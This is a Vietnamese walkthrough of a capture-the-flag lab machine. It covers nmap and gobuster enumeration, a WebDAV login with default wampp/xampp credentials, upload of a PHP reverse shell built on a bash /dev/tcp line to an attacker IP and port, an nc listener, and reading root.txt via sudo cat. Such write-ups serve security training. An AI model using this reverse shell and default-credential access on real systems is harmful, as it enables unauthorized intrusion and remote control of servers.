- Chúng ta sẽ khởi động máy ảo và quét các port của IP bằng nmap
`` nmap -sV 10.48.131.237 ``
![img](img/nmap.png?raw=true)
- Có thể thấy kết quả trả về có một port 80 đang mở 
- Mở IP này với port 80 và dùng gobuster để tìm kiếm các file ẩn 
- ![img](img/web.png?raw=true)
``gobuster dir -u http://10.48.131.237/ -w /usr/share/dirb/wordlists/common.txt``
- ![img](img/gobuster.png?raw=true)
- Có thể thấy webdav đang chạy
- Chúng ta sẽ truy cập vào file này, một trang đăng nhập sẽ hiện ra. Chúng ta cần một số thông tin đăng nhập, và tìm kiếm trên Google, có thể tìm thấy một số thông tin đó.
- ![img](img/google.png?raw=true)
- Đăng nhập với user: wampp và pass: xampp
- Chúng ta sẽ tới được trang như sau
- ![img](img/login.png?raw=true)
- ![img](img/passwd.png?raw=true)
- Trong file passwd.dav là mật khẩu đã bị băm của wampp
- Quay lại với thông tin đã tìm kiếm trên Google thì chúng ta sẽ đăng nhập vào server của Webdav bằng cadaver
``cadaver http://10.48.131.237/webdav``
- ![img](img/cadaver.png?raw=true)
- Đăng nhập với username: wampp và password:xampp
- Chúng ta sẽ tải lên một reverse shell PHP. Chúng ta sẽ sử dụng reverse shell của PentestMonkey. Tải xuống và sửa lại giá trị của tham số IP
- ![img](img/phpreverse.png?raw=true)
``<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.144.40/4001 0>&1'");``
- Sau đó tải lên file này lên webdav, chúng ta sẽ dùng lệnh
``put phpreverse.php``
- ![img](img/upload.png?raw=true)
- Sau đó lắng nghe tại port chúng ta đã đặt và truy cập vào được shell
``nc -nvlp 4001``
- ![img](img/nc.png?raw=true)
- Chúng ta có thể tìm thấy file user.txt trong thư mục người dùng merlin
- ![img](img/user.png?raw=true)
- Bây giờ chúng ta cần tìm file root.txt
- Chúng ta sẽ chạy ``sudo -l`` để xem user www-data có thể chạy những lệnh nào
- ![img](img/sudo.png?raw=true)
- Có vẻ như chúng ta có thể chạy lệnh ``cat`` với super user privileges để đọc file root.txt
- ![img](img/root.png?raw=true)